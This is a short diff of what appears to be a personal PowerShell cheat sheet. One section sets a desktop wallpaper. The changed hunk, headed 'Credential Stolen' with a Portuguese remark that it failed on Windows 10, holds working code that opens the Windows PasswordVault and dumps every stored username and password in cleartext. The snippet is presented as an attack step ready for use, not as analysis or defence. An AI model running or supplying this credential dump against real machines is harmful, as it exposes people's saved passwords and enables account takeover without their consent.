@@ -51,8 +51,9 @@ SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniCh
 Add-Type -TypeDefinition $setwallpapersrc
 [wallpaper]::SetWallpaper("h:\Quotefancy-1542-3840x2160.jpg") 
 
-=> Credential Stolen
-[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+=> Credential Stolen =====> Win10 nao funcionou
+[void]
+[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 $vault = New-Object Windows.Security.Credentials.PasswordVault 
 $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
 
